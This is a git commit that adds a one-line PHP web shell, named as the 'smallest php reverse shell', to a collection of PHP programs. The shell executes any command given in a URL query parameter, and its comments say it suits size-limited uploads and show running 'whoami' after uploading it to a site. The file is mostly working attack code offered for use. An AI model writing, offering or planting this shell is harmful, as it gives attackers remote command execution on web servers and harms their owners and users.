e1d3ea6e79bf76dfd03f2ec8b85ab8fb7d0b0ddd
thephenix4 <69722745+thephenix4@users.noreply.github.com>
2021-10-02 05:20:30 +0100

    Create smallest_php__reverse_shell.php
    smallest php shell ever

---
+++ php-programs/smallest_php__reverse_shell.php
@@ -0,0 +1,12 @@
+// `` is backtick character anything b/w this execute directly.
+// you can use where size limit is a factor
+
+<?=`$_GET[C]`?>
+
+/*
+example:
+after uploading the shell
+
+https://example.com?C=whoami
+
+*/
